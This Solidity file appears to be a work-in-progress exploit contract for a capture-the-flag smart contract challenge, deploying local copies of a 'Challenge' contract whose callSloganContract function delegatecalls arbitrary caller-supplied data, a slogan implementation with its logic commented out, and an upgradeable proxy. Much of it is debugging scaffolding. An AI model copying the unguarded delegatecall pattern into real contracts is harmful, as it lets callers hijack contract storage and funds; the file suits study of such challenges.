// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_kuldeep23907 {
    function callSloganContract(bytes memory) external payable;

    function sloganContract() external view returns (address);
}

interface IChallenge_kuldeep23907_Slogan {
    function currentSloganOwner() external view returns (address);

    function setSlogan(string memory) external payable;
}

interface ISloganProxy_kuldeep23907 {}

interface ILollercoaster_kuldeep23907 {
    function randInt(uint256 n) external view returns (uint256);
}

contract Exploit_kuldeep23907 {
    IChallenge_kuldeep23907 instance;
    IChallenge_kuldeep23907_Slogan slogan;
    Slogan s;

    constructor(IChallenge_kuldeep23907 _instance) payable {
        instance = _instance;

        s = new Slogan();
        SloganProxy sloganProxy = new SloganProxy();
        sloganProxy.initialize(address(s), "");
        instance = IChallenge_kuldeep23907(address(new Challenge{value: 1 ether}(address(sloganProxy))));
        slogan = IChallenge_kuldeep23907_Slogan(address(instance.sloganContract()));
    }

    function finalize() external payable {
        // slogan.setSlogan("asd");
        // console.log(slogan.currentSloganOwner());
        instance.callSloganContract{value: 0.001 ether}(abi.encodeWithSignature("setSlogan(string)", "asd"));
        // console.log(slogan.currentSloganOwner());
        selfdestruct(payable(msg.sender));
    }
}

import "@openzeppelin/contracts/proxy/Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Upgrade.sol";

contract Challenge {
    address public sloganContract;

    constructor(address _contract) payable {
        sloganContract = _contract;
    }

    function callSloganContract(bytes memory data) public payable {
        require((sloganContract) != address(0));
        (bool success, bytes memory error) = (sloganContract).delegatecall(data);
        require(success, string(error));
    }
}

contract Slogan {
    string public slogan;
    address public currentSloganOwner;

    function setSlogan(string memory _str) public returns (bool) {
        console.log(address(this));
        console.log("here");
        // require(msg.value == 0.001 ether, "invalid");
        // slogan = _str;
        // currentSloganOwner = msg.sender;
        // return true;
        return true;
    }
}

contract InitialiazableUpgradeableProxy is Proxy, ERC1967Upgrade {
    function _beforeFallback() internal override(Proxy) {
        console.log("beforeFallback");
    }

    // function setSlogan(string memory s) public payable {
    //     console.log("inner");
    // }

    function initialize(address _logic, bytes memory _data) public payable {
        require(_implementation() == address(0));
        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        _upgradeTo(_logic);
        if (_data.length > 0) {
            (bool success, ) = _logic.delegatecall(_data);
            require(success);
        }
    }

    function _implementation() internal view virtual override returns (address impl) {
        return _getImplementation();
    }
}

contract SloganProxy is InitialiazableUpgradeableProxy {}
